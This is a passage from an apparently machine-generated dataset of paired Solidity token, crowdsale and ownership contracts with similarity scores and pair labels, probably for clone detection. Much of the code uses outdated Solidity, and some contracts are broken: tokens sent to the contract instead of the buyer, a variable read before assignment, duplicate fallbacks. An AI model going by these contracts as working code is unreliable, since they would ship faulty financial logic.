       balances[msg.sender] = INITIAL_SUPPLY;
    }
}",1,,,,,
"contract Crowdsale {
  using SafeMath for uint256;

   
  TOKKA public token;

  
  uint256 public startTime;
  uint256 public endTime;

  
  address public wallet;

  
  uint256 public rate;

  
  uint256 public weiRaised;

  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);


  function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) public {
    require(_startTime >= now);
    require(_endTime >= _startTime);
    require(_rate > 0);
    require(_wallet != address(0));

    startTime = _startTime;
    endTime = _endTime;
    rate = _rate;
    wallet = _wallet;
    token = createTokenContract();
  }



function createTokenContract() internal returns (TOKKA) {
    return new TOKKA();
  }


  
  function () external payable {
    buyTokens(msg.sender);
  }

  
function buyTokens(address beneficiary) public payable {
    require(beneficiary != address(0));
    require(validPurchase());

    uint256 weiAmount = msg.value;

    
    uint256 tokens = weiAmount.mul(rate);

    
    weiRaised = weiRaised.add(weiAmount);

    
    
    StandardToken(token).transfer(this, tokens);


    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);

    forwardFunds();
}


  function forwardFunds() internal {
    wallet.transfer(msg.value);
  }


  function validPurchase() internal view returns (bool) {
    bool withinPeriod = now >= startTime && now <= endTime;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }


  function hasEnded() public view returns (bool) {
    return now > endTime;
  }

}",0.958408272,"contract Crowdsale {
    using SafeMath for uint256;

    
    MintableToken public token;

    
    uint256 public startTime;
    uint256 public endTime;

    
    address public wallet;

    
    uint256 public rate;

    
    uint256 public weiRaised;

    
    event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);


    function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) {
        require(_startTime >= now);
        require(_endTime >= _startTime);
        require(_rate > 0);
        require(_wallet != address(0));

        token = createTokenContract();
        startTime = _startTime;
        endTime = _endTime;
        rate = _rate;
        wallet = _wallet;
    }

    
    
    function createTokenContract() internal returns (MintableToken) {
        return new MintableToken();
    }


    
    function () payable {
        buyTokens(msg.sender);
    }

    
    function buyTokens(address beneficiary) public payable {
        require(beneficiary != address(0));
        require(validPurchase());

        uint256 weiAmount = msg.value;

        
        uint256 tokens = weiAmount.mul(rate);

        
        weiRaised = weiRaised.add(weiAmount);

        token.mint(beneficiary, tokens);
        TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);

        forwardFunds();
    }

    
    
    function forwardFunds() internal {
        wallet.transfer(msg.value);
    }

    
    function validPurchase() internal constant returns (bool) {
        bool withinPeriod = now >= startTime && now <= endTime;
        bool nonZeroPurchase = msg.value != 0;
        return withinPeriod && nonZeroPurchase;
    }

    
    function hasEnded() public constant returns (bool) {
        return now > endTime;
    }
}",1,,,,,
"contract simpleStorage {
    uint storedData = 4;

    function set(uint x) {
        storedData = x;
    }

    function get() constant returns (uint retVal) {
        return storedData;
    }
}",0.930916571,"contract SimpleStorage {
    uint storedData;

    function set(uint x) {
        storedData = x;
    }

    function get() constant returns (uint storedData) {
        return storedData;
    }
}",1,*,,,,
"contract MyToken {
    
    string public standard = 'Token 0.1';
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    function MyToken(
        uint256 initialSupply,
        string tokenName,
        uint8 decimalUnits,
        string tokenSymbol
        ) {
        balanceOf[msg.sender] = initialSupply;              
        totalSupply = initialSupply;                        
        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals = decimalUnits;                            
    }

    
    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            
        Transfer(msg.sender, _to, _value);                   
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        tokenRecipient spender = tokenRecipient(_spender);
        spender.receiveApproval(msg.sender, _value, this, _extraData);
        return true;
    }

    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (balanceOf[_from] < _value) throw;                 
        if (balanceOf[_to] + _value < balanceOf[_to]) throw;  
        if (_value > allowance[_from][msg.sender]) throw;   
        balanceOf[_from] -= _value;                          
        balanceOf[_to] += _value;                            
        allowance[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }

    
    function () {
        throw;     
    }
}",0.992697358,"contract token {
    
    string public standard = &#39;Token 0.1&#39;;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    function token(
        uint256 initialSupply,
        string tokenName,
        uint8 decimalUnits,
        string tokenSymbol
        ) {
        balanceOf[msg.sender] = initialSupply;              
        totalSupply = initialSupply;                        
        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals = decimalUnits;                            
    }

    
    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            
        Transfer(msg.sender, _to, _value);                   
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        tokenRecipient spender = tokenRecipient(_spender);
        spender.receiveApproval(msg.sender, _value, this, _extraData);
        return true;
    }

    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (balanceOf[_from] < _value) throw;                 
        if (balanceOf[_to] + _value < balanceOf[_to]) throw;  
        if (_value > allowance[_from][msg.sender]) throw;   
        balanceOf[_from] -= _value;                          
        balanceOf[_to] += _value;                            
        allowance[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }

    
    function () {
        throw;     
    }
}",1,,,,,
"contract Ownable {
  address public owner;

  function Ownable() public {
    owner = msg.sender;
  }

  modifier Owned {
    require(msg.sender == owner);
    _;
  }
}",0.949875537,"contract Ownable {
  address public owner;

  
  function Ownable() public {
    owner = msg.sender;
  }

  
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

 

}",1,,,,,
"contract Mortal is Ownable {
  function kill() public Owned { 
    selfdestruct(owner);
  }
}",0.92046773,"contract Mortal is Ownable {
  function kill() public onlyOwner {
    selfdestruct(owner);
  }
}",2,,,,,
"contract linkERC20Basic {
  uint256 public totalSupply;
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}",0.983032531,"contract ERC20Basic {

  uint256 public totalSupply;

  function balanceOf(address who) public view returns (uint256);

  function transfer(address to, uint256 value) public returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

}",1,,,,,
"contract linkERC20 is linkERC20Basic {
  function allowance(address owner, address spender) public view returns (uint256);
  function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}",0.964418673,"contract ERC20 is ERC20Basic {

    function allowance(address owner, address spender) public constant returns (uint256);

    function transferFrom(address from, address to, uint256 value) public returns (bool);

    function approve(address spender, uint256 value) public returns (bool);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}",1,,,,,
"contract linkBasicToken is linkERC20Basic {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  
  function transfer(address _to, uint256 _value) public returns (bool) {
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }

}",0.957152156,"contract BasicToken is ERC20Basic {

  using SafeMath for uint256;

  mapping(address => uint256) balances;



  

  function transfer(address _to, uint256 _value) public returns (bool) {

    

    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    emit Transfer(msg.sender, _to, _value);

    return true;

  }



  

  function balanceOf(address _owner) public constant returns (uint256 bal) {

    return balances[_owner];

  }

}",1,,,,,
"contract ERC677Token is ERC677 {

  
  function transferAndCall(address payable _to, uint _value, bytes memory _data)
    public
    returns (bool success)
  {
    super.transfer(_to, _value);
    Transfer(msg.sender, _to, _value, _data);
    if (isContract(_to)) {
      contractFallback(_to, _value, _data);
    }
    return true;
  }


  

  function contractFallback(address _to, uint _value, bytes memory _data)
    private
  {
    ERC677Receiver receiver = ERC677Receiver(_to);
    receiver.onTokenTransfer(msg.sender, _value, _data);
  }

  function isContract(address _addr)
    private
    returns (bool hasCode)
  {
    uint length;
    assembly { length := extcodesize(_addr) }
    return length > 0;
  }

}",0.97574162,"contract ERC677Token is IERC677 {



  

  function transferAndCall(address _to, uint _value, bytes memory _data)

    public

    returns (bool success)

  {

    transfer(_to, _value);

    

    emit Transfer(msg.sender, _to, _value, _data);

    if (isContract(_to)) {

      contractFallback(_to, _value, _data);

    }

    return true;

  }





  



  function contractFallback(address _to, uint _value, bytes memory _data)

    private

  {

    ERC677Receiver receiver = ERC677Receiver(_to);

    receiver.onTokenTransfer(msg.sender, _value, _data);

  }



  function isContract(address _addr) 

    private view 

    returns (bool hasCode)

  {

    uint length;

    assembly { length := extcodesize(_addr) }

    return length > 0;

  }



}",1,,,,,
"contract MyToken {
    
    mapping (address => uint256) public balanceOf;

    
    function MyToken(
        uint256 initialSupply
        ) {
        balanceOf[msg.sender] = initialSupply;              
    }

    
    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            
    }
}",0.976380312,"contract SOCToken {
    
    mapping (address => uint256) public balanceOf;

    
    function SOCToken(
        uint256 initialSupply
        ) {
        balanceOf[msg.sender] = initialSupply;              
    }

    
    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            
    }
}",1,,,,,
"contract BizzleTokenSale {

address admin;

BizzleToken public tokenContract;
uint256 public tokenPrice;
uint256 public tokensSold;


event Sell(address _buyer, uint256 _amount);

function BizzleTokenSale(BizzleToken _tokenContract, uint256 _tokenPrice) public {
    admin = msg.sender;
    tokenContract = _tokenContract;
    tokenPrice = _tokenPrice;


}

function multiply(uint x, uint y) internal pure returns (uint z) {

    require(y == 0 || (z = x * y) / y == x);

}

function buyTokens(uint256 _numberOfTokens) public payable {

    
    require(msg.value == multiply(_numberOfTokens, tokenPrice));

    
    require(tokenContract.balanceOf(this) >= _numberOfTokens);

    
    require(tokenContract.transfer(msg.sender, _numberOfTokens));

    
    tokensSold += _numberOfTokens;

    
    Sell(msg.sender, _numberOfTokens);
}

 function endSale() public {
    require(msg.sender == admin);
    require(tokenContract.transfer(admin, tokenContract.balanceOf(this)));
    admin.transfer(address(this).balance);
}
}",0.969999506,"contract DappTokenSale {

    address admin;

    DappToken public tokenContract;

    uint256 public tokenPrice;

    uint256 public tokensSold;



    event Sell(address _buyer, uint256 _amount);



    function DappTokenSale(DappToken _tokenContract, uint256 _tokenPrice) public {

        admin = msg.sender;

        tokenContract = _tokenContract;

        tokenPrice = _tokenPrice;

    }



    function multiply(uint x, uint y) internal pure returns (uint z) {

        require(y == 0 || (z = x * y) / y == x);

    }



    function buyTokens(uint256 _numberOfTokens) public payable {

        require(msg.value == multiply(_numberOfTokens, tokenPrice));

        require(tokenContract.balanceOf(this) >= _numberOfTokens);

        require(tokenContract.transfer(msg.sender, _numberOfTokens));



        tokensSold += _numberOfTokens;



        Sell(msg.sender, _numberOfTokens);

    }



    function endSale() public {

        require(msg.sender == admin);

        require(tokenContract.transfer(admin, tokenContract.balanceOf(this)));



        

        

        admin.transfer(address(this).balance);

    }

}",1,,,,,
"contract PWXTokenERC20 {
    string public constant _myTokeName = 'Power Token';
    string public constant _mySymbol = 'PWX';
    uint public constant _myinitialSupply = 1000000;
    uint8 public constant _myDecimal = 18;
    
    string public name;
    string public symbol;
    uint8 public decimals;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function PWXTokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        decimals = _myDecimal;
        totalSupply = _myinitialSupply * (10 ** uint256(_myDecimal));  
        balanceOf[msg.sender] = totalSupply;                
        name = _myTokeName;                                   
        symbol = _mySymbol;                               
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}",0.930540819,"contract TokenERC20 {

   

    string public name;

    string public symbol;

    uint8 public decimals = 18;

  

    uint256 public totalSupply;



  

    mapping (address => uint256) public balanceOf;

    mapping (address => mapping (address => uint256)) public allowance;



   

    event Transfer(address indexed from, address indexed to, uint256 value);

 

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);



   

    event Burn(address indexed from, uint256 value);



  

    constructor(

        uint256 initialSupply,

        string memory tokenName,

        string memory tokenSymbol

    ) public {

        totalSupply = initialSupply * 10 ** uint256(decimals);  

        balanceOf[msg.sender] = totalSupply;               

        name = tokenName;                                   

        symbol = tokenSymbol;                               

    }



   

    function _transfer(address _from, address _to, uint _value) internal {

      

        require(_to != address(0x0));



        require(balanceOf[_from] >= _value);

        

        require(balanceOf[_to] + _value >= balanceOf[_to]);

       

        uint previousBalances = balanceOf[_from] + balanceOf[_to];

        

        balanceOf[_from] -= _value;

        

        balanceOf[_to] += _value;

        emit Transfer(_from, _to, _value);

       

        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);

    }



   

    function transfer(address _to, uint256 _value) public returns (bool success) {

        _transfer(msg.sender, _to, _value);

        return true;

    }



   

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {

        require(_value <= allowance[_from][msg.sender]);    

        allowance[_from][msg.sender] -= _value;

        _transfer(_from, _to, _value);

        return true;

    }



   

    function approve(address _spender, uint256 _value) public

        returns (bool success) {

        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }



   

    function approveAndCall(address _spender, uint256 _value, bytes memory _extraData)

        public

        returns (bool success) {

        tokenRecipient spender = tokenRecipient(_spender);

        if (approve(_spender, _value)) {

            spender.receiveApproval(msg.sender, _value, address(this), _extraData);

            return true;

        }

    }



   

    function burn(uint256 _value) public returns (bool success) {

        require(balanceOf[msg.sender] >= _value);   

        balanceOf[msg.sender] -= _value;           

        totalSupply -= _value;                      

        emit Burn(msg.sender, _value);

        return true;

    }



   

    function burnFrom(address _from, uint256 _value) public returns (bool success) {

        require(balanceOf[_from] >= _value);                

        require(_value <= allowance[_from][msg.sender]);    

        balanceOf[_from] -= _value;                         

        allowance[_from][msg.sender] -= _value;             

        totalSupply -= _value;                             

        emit Burn(_from, _value);

        return true;

    }

}",2,,,,,
"contract Token {
    function totalSupply() constant public returns (uint totalSupply);
    function balanceOf(address _owner) constant public returns (uint balance);
    function transfer(address _to, uint _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint _value) public returns (bool success);
    function approve(address _spender, uint _value) public returns (bool success);
    function allowance(address _owner, address _spender) constant public returns (uint remaining);
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}",0.922462105,"contract Erc20

{   

    

    function totalSupply() public view returns (uint256 amount);

    function balanceOf(address owner) public view returns (uint256 balance);

    function transfer(address to, uint256 value) public returns (bool success);

    function transferFrom(address from, address to, uint256 value) public returns (bool success);

    function approve(address spender, uint256 value) public returns (bool success);

    function allowance(address owner, address spender) public view returns (uint256 remaining);

    

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}",1,,,,,
"contract TestToken is StandardToken {

    function() public {
        
        revert();
    }

    

    
    string public name = ""TestToken"";                   
    uint8 public decimals = 0;                
    string public symbol = ""TTT"";                 
    string public version = ""1.0"";       







    function TestToken() public {
        balances[msg.sender] = 100000;               
        totalSupply = 100000;                        
        name = ""TestToken"";                                   
        decimals = 0;                            
        symbol = ""TTT"";                               
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(keccak256(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { revert(); }
        return true;
    }
}",0.906377308,"contract Grimmjow8Token is StandardToken {

    function () public {
        
        throw;
    }

    

    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = &#39;H1.0&#39;;       




    function Grimmjow8Token() public {
        balances[msg.sender] = 10000000;               
        totalSupply = 10000000;                        
        name = ""Grimmjow8 Token"";                      
        decimals = 0;                                  
        symbol = ""GRIMM"";                              
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}",1,,,,,
"contract NMRToken is StandardToken { 

    
    function () {
    }
    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = 'H1.0'; 
    uint256 public unitsOneEthCanBuy;     
    uint256 public totalEthInWei;         
    address public fundsWallet;           

    
    
    function NMRToken() {
        balances[msg.sender] = 100000000000000000000000000;    
        totalSupply = 100000000000000000000000000;                        
        name = ""VEToken"";                                   
        decimals = 18;                                               
        symbol = ""VET"";                                             
        unitsOneEthCanBuy = 1000;                                      
        fundsWallet = msg.sender;                                    
    }

    function() payable{
        totalEthInWei = totalEthInWei + msg.value;
        uint256 amount = msg.value * unitsOneEthCanBuy;
        require(balances[fundsWallet] >= amount);

        balances[fundsWallet] = balances[fundsWallet] - amount;
        balances[msg.sender] = balances[msg.sender] + amount;

        Transfer(fundsWallet, msg.sender, amount); 

        
        fundsWallet.transfer(msg.value);                               
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { require; }
        return true;
    }
}",0.954043646,"contract CoinNewsChannel is StandardToken { 



    

    string public name;                   

    uint8 public decimals;                

    string public symbol;                

    string public version = 'H1.0'; 

    uint256 public unitsOneEthCanBuy;     

    uint256 public totalEthInWei;         

    address public fundsWallet;          



    function CoinNewsChannel() {

        balances[msg.sender] = 1000000000000000000000000;              

        totalSupply = 1000000000000000000000000;                        

        name = ""CoinNewsChannel"";                                   

        decimals = 18;                                               

        symbol = ""SCNCT"";                                             

        unitsOneEthCanBuy = 1000;                                     

        fundsWallet = msg.sender;                                   

    }



    function() payable{

        totalEthInWei = totalEthInWei + msg.value;

        uint256 amount = msg.value * unitsOneEthCanBuy;

        require(balances[fundsWallet] >= amount);



        balances[fundsWallet] = balances[fundsWallet] - amount;

        balances[msg.sender] = balances[msg.sender] + amount;



        Transfer(fundsWallet, msg.sender, amount); 



        

        fundsWallet.transfer(msg.value);                               

    }



    

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);



        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }

        return true;

    }

}",1,,,,,
"contract AntiCoin {
    
    mapping (address => uint256) public balanceOf;

    string public name = ""AntiCoin"";
    string public symbol = ""ANTI"";
    uint256 public max_supply = 50000000000000;
    uint256 public unspent_supply = 0;
    uint256 public spendable_supply = 0;
    uint256 public circulating_supply = 0;
    uint256 public decimals = 6;
    uint256 public reward = 50000000;
    uint256 public timeOfLastHalving = now;
    uint public timeOfLastIncrease = now;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Mint(address indexed from, uint256 value);

    
    function AntiCoinInit() public {
      timeOfLastHalving = now;
    }

    function updateSupply() internal returns (uint256) {

      if (now - timeOfLastHalving >= 2100000 minutes) {
        reward /= 2;
        timeOfLastHalving = now;
      }

      if (now - timeOfLastIncrease >= 150 seconds) {
        uint256 increaseAmount = ((now - timeOfLastIncrease) / 150 seconds) * reward;
        spendable_supply += increaseAmount;
        unspent_supply += increaseAmount;
        timeOfLastIncrease = now;
      }

      circulating_supply = spendable_supply - unspent_supply;

      return circulating_supply;
    }

    
    function transfer(address _to, uint256 _value) public {
        require(balanceOf[msg.sender] >= _value);           
        require(balanceOf[_to] + _value >= balanceOf[_to]); 
        balanceOf[msg.sender] -= _value;                    
        balanceOf[_to] += _value;                           

        updateSupply();

        
        Transfer(msg.sender, _to, _value);

    }
    
    function mint() public payable {
        require(balanceOf[msg.sender] + _value >= balanceOf[msg.sender]); 
        uint256 _value = msg.value / 100000000;

        updateSupply();

        require(unspent_supply - _value <= unspent_supply);
        unspent_supply -= _value; 
        balanceOf[msg.sender] += _value; 

        updateSupply();

        
        Mint(msg.sender, _value);

    }

    function withdraw(uint256 amountToWithdraw) public returns (bool) {

        

        require(balanceOf[msg.sender] >= amountToWithdraw);
        require(balanceOf[msg.sender] - amountToWithdraw <= balanceOf[msg.sender]);

        
        balanceOf[msg.sender] -= amountToWithdraw;

        
        unspent_supply += amountToWithdraw;
        
        amountToWithdraw *= 100000000;

        
        msg.sender.transfer(amountToWithdraw);

        updateSupply();

        return true;
    }
}",0.979706803,"contract EthereumPrivate{

    

    mapping (address => uint256) public balanceOf;



    string public name = ""EthereumPrivate"";

    string public symbol = ""PETH"";

    uint256 public max_supply = 18000000000000;

    uint256 public unspent_supply = 0;

    uint256 public spendable_supply = 0;

    uint256 public circulating_supply = 0;

    uint256 public decimals = 6;

    uint256 public reward = 50000000;

    uint256 public timeOfLastHalving = now;

    uint public timeOfLastIncrease = now;



    event Transfer(address indexed from, address indexed to, uint256 value);

    event Mint(address indexed from, uint256 value);



    

    function howCoin() public {

      timeOfLastHalving = now;

    }



    function updateSupply() internal returns (uint256) {



      if (now - timeOfLastHalving >= 2100000 minutes) {

        reward /= 2;

        timeOfLastHalving = now;

      }



      if (now - timeOfLastIncrease >= 150 seconds) {

        uint256 increaseAmount = ((now - timeOfLastIncrease) / 150 seconds) * reward;

        spendable_supply += increaseAmount;

        unspent_supply += increaseAmount;

        timeOfLastIncrease = now;

      }



      circulating_supply = spendable_supply - unspent_supply;



      return circulating_supply;

    }



    

    function transfer(address _to, uint256 _value) public {

        require(balanceOf[msg.sender] >= _value);           

        require(balanceOf[_to] + _value >= balanceOf[_to]); 

        balanceOf[msg.sender] -= _value;                    

        balanceOf[_to] += _value;                           



        updateSupply();



        

        Transfer(msg.sender, _to, _value);



    }

    

    function mint() public payable {

        require(balanceOf[msg.sender] + _value >= balanceOf[msg.sender]); 

        uint256 _value = msg.value / 100000000;



        updateSupply();



        require(unspent_supply - _value <= unspent_supply);

        unspent_supply -= _value; 

        balanceOf[msg.sender] += _value; 



        updateSupply();



        

        Mint(msg.sender, _value);



    }



    function withdraw(uint256 amountToWithdraw) public returns (bool) {



        



        require(balanceOf[msg.sender] >= amountToWithdraw);

        require(balanceOf[msg.sender] - amountToWithdraw <= balanceOf[msg.sender]);



        

        balanceOf[msg.sender] -= amountToWithdraw;



        

        unspent_supply += amountToWithdraw;

        

        amountToWithdraw *= 100000000;



        

        msg.sender.transfer(amountToWithdraw);



        updateSupply();



        return true;

    }

}",1,,,,,
"contract Owned {
    address public owner;
    address public newOwner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
        emit OwnershipTransferred(owner, _newOwner);
    }

}",0.921581294,"contract Ownable {
    address public owner;


    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    
    constructor() public {
        owner = msg.sender;
    }

    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

}",1,,,,,
"contract MyToken {
    
    mapping (address => uint256) public balanceOf;

    
    function MyToken(
        uint256 initialSupply
        ) public {
        balanceOf[msg.sender] = initialSupply;              
    }

    
    function transfer(address _to, uint256 _value) public {
        require(balanceOf[msg.sender] >= _value);           
        require(balanceOf[_to] + _value >= balanceOf[_to]); 
        balanceOf[msg.sender] -= _value;                    
        balanceOf[_to] += _value;                           
    }
}",0.900596204,"contract SOCToken {
    
    mapping (address => uint256) public balanceOf;

    
    function SOCToken(
        uint256 initialSupply
        ) {
        balanceOf[msg.sender] = initialSupply;              
    }

    
    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            
    }
}",2,,,,,
"contract DemoCoin {
    
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function DemoCoin(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol,
        uint8 tokenDecimal
    ) public {
        totalSupply = initialSupply * 10;  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals=tokenDecimal;
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}",0.932294462,"contract TokenERC20 {
    string public name=""Ecological Industry"";
    string public symbol=""ECO"";
    uint8 public decimals = 4; 
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Burn(address indexed from, uint256 value);

    constructor() public {
